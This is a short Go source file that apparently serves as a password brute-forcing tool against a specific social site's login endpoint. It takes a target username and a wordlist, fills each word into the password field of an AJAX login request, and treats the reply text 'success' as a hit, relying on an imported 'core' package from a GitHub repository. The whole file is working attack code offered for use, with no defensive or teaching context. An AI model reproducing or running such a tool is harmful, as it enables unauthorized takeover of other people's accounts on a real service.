package main

import (
  "flag"
  "github.com/neonify/J27/core"
  )

func main(){
  
  core.Banner()
  
  user := flag.String("u","","2 specify the target username")
  fyl  := flag.String("f","","2 specify the wordlist")
  
  flag.Parse()

  url := "http://m.qooh.me/user/designed-login/"
  tout := 0
  word := "success"
  Data := "tp=ajax&username="+*user+"&password=FUZZ"
    

  details := core.Details{url,Data,*fyl,word,tout}
  
  details.Concer()
}


